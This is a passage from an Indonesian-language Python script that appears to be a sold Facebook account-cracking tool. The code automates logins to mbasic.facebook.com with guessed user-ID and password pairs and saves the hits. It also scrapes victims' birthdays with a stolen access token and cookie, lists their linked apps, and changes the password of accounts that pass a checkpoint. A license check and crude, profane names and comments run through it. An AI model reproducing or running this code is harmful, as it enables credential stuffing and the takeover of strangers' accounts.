					token = open('token.txt','r').read();cuki = {"cookie":open('cookie.txt','r').read()};ttl = ses.get(f'https://graph.facebook.com/{uiz}?fields=birthday&access_token={token}',cookies=cuki).json()['birthday'];m, d, y = ttl.split('/');m = tete[m];______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}|{d} {m} {y}") #HikmatXFX(uiz,pw,all_ua)
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
					break
				except:
					______Hikmat_Ganteng_Banget_Coy______(f"\r{K} *--> {uiz}|{pw}")
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					#HikmatXFX(uiz,pw,all_ua)
					cp+=1
					break
			else:continue
		except requests.exceptions.ConnectionError:turu(31)
	HikmatXD+=1

def cek_apk(ses,kuki):
	__Hikmat__=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sup = sop(__Hikmat__,"html.parser")
	____Porn___Hub___ = sup.find("form",method="post")
	______GAME_____ = [i.text for i in ____Porn___Hub___.find_all("h3")]
	if len(______GAME_____)==0:
		______Hikmat_Ganteng_Banget_Coy______('\r'+garis+M+' tidak ada apk aktif yang terkait ')
	else:
		______Hikmat_Ganteng_Banget_Coy______('\r'+garis+H+' aplikasi yang terkait : ')
		for i in range(len(______GAME_____)):
			______Hikmat_Ganteng_Banget_Coy______("\r"+garis+" %s%s. %s%s"%(P,i+1,______GAME_____[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))
	__Hikmat__=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sup = sop(__Hikmat__,"html.parser")
	____Porn___Hub___ = sup.find("form",method="post")
	______GAME_____ = [i.text for i in ____Porn___Hub___.find_all("h3")]
	if len(______GAME_____)==0:
		______Hikmat_Ganteng_Banget_Coy______('\r'+garis+M+' tidak ada apk kadaluarsa yang terkait ')
	else:
		______Hikmat_Ganteng_Banget_Coy______('\r'+garis+K+' aplikasi kadaluarsa yang terkait : ')
		for i in range(len(______GAME_____)):
			______Hikmat_Ganteng_Banget_Coy______("\r"+garis+" %s%s. %s%s"%(P,i+1,______GAME_____[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
		else:
			______Hikmat_Ganteng_Banget_Coy______('\r') 

def HikmatXFX(uiz,pw,all_ua):
	mb = ("https://mbasic.facebook.com")
	#ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(all_ua);ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uiz,"pass":pw})
	try:
		run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		______Hikmat_Ganteng_Banget_Coy______("\r %sakun ke spam "%(M))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(run)):
		______Hikmat_Ganteng_Banget_Coy______(f"{garis} mode pesawatkan 5 detik!!", end='\r');turu(7);metode_validate(uiz,pwr,link_okep);sys.stdout.flush()
	elif "c_user" in ses.cookies.get_dict().keys():
			if "Akun Anda Dikunci" in str(run):
				______Hikmat_Ganteng_Banget_Coy______(f"\r{garis} akun anda terkunci ");open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
			else:
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]);______Hikmat_Ganteng_Banget_Coy______(f"\r{garis} akun tidak checkpoint/ok ");cek_apk(ses,kuki);open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
	elif "checkpoint" in ses.cookies.get_dict().keys():
		headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):
				______Hikmat_Ganteng_Banget_Coy______("\r %s*--> akun terpasang a2f "%(M));open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
			elif "Lihat detail login yang ditampilkan. Ini Anda?" in str(run):
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pws(uiz,pw,run,fm)
				else:
					print("\r %sakun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(garis,H,uiz,pw,kuki[0],P))
				______Hikmat_Ganteng_Banget_Coy______("\r %s*--> akun tapyes!!.. segera check di fb lite/mbasic"%(H));open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		else:
			______Hikmat_Ganteng_Banget_Coy______("\r%s *--> terdapat %s opsi : "%(K,str(len(ngew))))
		for opt in range(len(ngew)):
			______Hikmat_Ganteng_Banget_Coy______("\r "*5, str(opt+1)+". "+ngew[opt]);open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')


def ubah_pws(uiz,pw,run,fm):
	ses = requests.Session()
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in run("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=ses.post(url+fm.get("action"),data=dat).text
	resUbah=sop(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=ses.post(url+link3.get("action"),data=dat2)
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,uiz,pwbaru[0],kuki,P))
		cek_apk(ses,kuki)

#------------[ CODE KEY BY MADD-KW]-------------#
#  Plis Bang Kasih Nama Gua Tenar Dikit ;v

def key():
	os.system("clear");banner();key = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} masukan lisensi : {H}")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyMzQzNDM1OSIsIlBsbmx6K3p6ZnIvanVUaTBjWjIvMy9vMWU1QlZxbXU3MVFzTi9JaHMiXQ==&ProductId=16316&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("key.txt","w").write(key);______Hikmat_Ganteng_Banget_Coy______(f"{garis} lisensi aktif ");turu(3);_____Coeg____()
	except KeyError:
		______Hikmat_Ganteng_Banget_Coy______(f"{garis} lisensi anda invalid/kadaluarsa\n{garis} harap beli lisensi ke author script simple!!\n{garis} sedang diarahkan ke whatsapp admin untuk membeli lisensi atau minta key trial 1 hari untuk satu device/pengguna!! ");os.system("xdg-open https://wa.me/6281295853971?text=Bang+Hikmat+Beli+Lisensi+Lagi+Atau+Minta+Key+Trial+1+Hari");turu(3);exit()

def cek():
	try:x=open("key.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyMzQzNDM1OSIsIlBsbmx6K3p6ZnIvanVUaTBjWjIvMy9vMWU1QlZxbXU3MVFzTi9JaHMiXQ==&ProductId=16316&Key=%s"%(x)).json()['licenseKey']['key'];_____Coeg____()
	except KeyError:
		______Hikmat_Ganteng_Banget_Coy______(f"{garis} lisensi anda expired!!.. harap beli ke author sc simple atau minta lisensi trial 1 hari untuk satu device\n{garis} sedang diarahkan ke whastapp admin untuk membeli lisensi new atau lisensi trial!!");os.system("xdg-open https://wa.me/6281295853971?text=Bang+Hikmat+Beli+Lisensi+Lagi+Atau+Minta+Key+Trial+1+Hari");turu(3);exit()

#------------[ CODE KEY BY MADD-KW]-------------#
#  Plis Bang Kasih Nama Gua Tenar Dikit ;v
#  Thanks You Hikmat , I believe in me  >\\\<

def _____Coeg____():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	os.system("clear");cek_cookie()
	
	
def pil_sen():
	try:xz = open("key.txt","r").read()
	except FileNotFoundError:key()
	banner();______Hikmat_Ganteng_Banget_Coy______(f"{P} [1] ganti lisensi\n{P} [2] hapus lisensi\n{P} [3] lanjut ke fitur crack/login cookie")
	HikmatXYZ = ____Ngemut__Ngemut__Kontol_____________Kontol___Lu___(f"{garis} pilih : {H}")
	if HikmatXYZ in ["1"]:os.system("rm -rf key.txt");cek()
	elif HikmatXYZ in ["2"]:os.system("rm -rf key.txt");______Hikmat_Ganteng_Banget_Coy______(f"{garis} sukses menghapus lisensi");turu(3);exit()
	elif HikmatXYZ in ["3"]:cek()
	
if __name__=='__main__':
	try:pil_sen()
	except requests.exceptions.ConnectionError:exit(f'\n{garis} koneksi internet bermasalah');pil_sen()

'''
Pake Aja Kontol Jangan Rekod Juga
Dasar Anak Memek
Ngentod Yang Jual Sc Gw
Ini Free 100% Dan Result Tergantung Ganteng/Gk
'''